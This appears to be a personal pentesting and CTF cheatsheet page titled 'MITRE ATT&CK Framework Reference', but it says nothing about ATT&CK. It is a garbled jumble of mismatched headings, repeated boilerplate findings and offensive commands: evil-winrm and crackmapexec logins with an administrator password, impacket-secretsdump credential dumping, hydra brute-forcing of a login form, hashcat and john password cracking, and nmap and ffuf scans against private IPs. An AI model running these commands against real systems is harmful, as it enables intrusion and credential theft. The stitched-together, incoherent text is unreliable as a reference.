---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "blue team, cheatsheet, lateral movement, privilege escalation, enumeration"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-205.html"
URL_IMAGES: ""
Date: "2025-04-11"
Tags: "Blue Team, Cheatsheet, Lateral Movement, Privilege Escalation, Enumeration"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-205"
Permalink: "/notes/note-mitre-att&ck-framework-reference-205.html"
BtnLabel: "Read Notes"
Pick: 0
---
## GPP Password

### PHP

```bash
feroxbuster -h
```

- `Pass the Ticket`
- `secretsdump`
- `Sudo Misconfiguration`
- `DNS Rebinding`

## SQL Injection

### Kerberoasting

```powershell
evil-winrm -i 10.76.217.73 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.10.203.198 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.78.132.51 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.32.104.46/FUZZ
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## sqlmap

### atexec

The application stored sensitive credentials in an unencrypted configuration file. The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```python
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

> **Note:** DNS Rebinding was identified as the primary attack vector in this scenario.

- `ldapsearch`
- `wpscan`
- `Insecure Deserialization`
- `nikto`

## WordPress

### CMD

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.46.252.63 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p8888,587,25 10.108.50.194 -oN scan.txt
```

```bash
crackmapexec smb 10.121.216.141 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.179.70/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.178.60
```

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

## Kali Linux

### Insecure Deserialization

```bash
nmap -sCV -p21,443,8080 10.112.5.98 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.106.36
```

- `DNS Rebinding`
- `chisel`
- `secretsdump`
- `smbexec`
- `kerbrute`
- `Kerberoasting`

- `socat`
- `hydra`
- `secretsdump`
- `nmap`
- `feroxbuster`
